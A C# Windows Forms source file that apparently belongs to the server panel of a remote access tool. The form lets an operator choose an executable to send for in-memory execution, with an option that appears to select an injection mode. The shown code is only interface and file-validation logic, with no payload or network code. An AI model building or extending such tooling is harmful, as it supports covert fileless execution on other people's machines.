using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Reflection;
using Server.Helper;

namespace Server
{
    public partial class FormSendFileToMemory : Form
    {
        public bool IsOK = false;
        public FormSendFileToMemory()
        {
            InitializeComponent();
        }

        private void SendFileToMemory_Load(object sender, EventArgs e)
        {
            comboBox1.SelectedIndex = 0;
            comboBox2.SelectedIndex = 0;
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            switch (comboBox1.SelectedIndex)
            {
                case 0:
                    label3.Visible = false;
                    comboBox2.Visible = false;
                    break;
                case 1:
                    label3.Visible = true;
                    comboBox2.Visible = true;
                    break;

            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog O = new OpenFileDialog())
            {
                O.Filter = "(*.exe)|*.exe";
                if (O.ShowDialog() == DialogResult.OK)
                {
                    toolStripStatusLabel1.Text = Path.GetFileName(O.FileName);
                    toolStripStatusLabel1.Tag = O.FileName;
                    toolStripStatusLabel1.ForeColor = Color.Green;
                    IsOK = true;
                    if (comboBox1.SelectedIndex == 0)
                    {
                        try
                        {
                            new ReferenceLoader().AppDomainSetup(O.FileName);
                            IsOK = true;
                        }
                        catch
                        {
                            toolStripStatusLabel1.ForeColor = Color.Red;
                            toolStripStatusLabel1.Text += " Invalid!";
                            IsOK = false;
                        }
                    }
                }
                else
                {
                    toolStripStatusLabel1.Text = "";
                    toolStripStatusLabel1.ForeColor = Color.Black;
                    IsOK = true;
                }
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (IsOK)
                this.Hide();
        }

        private void Button3_Click(object sender, EventArgs e)
        {
            IsOK = false;
            this.Hide();
        }
    }
}
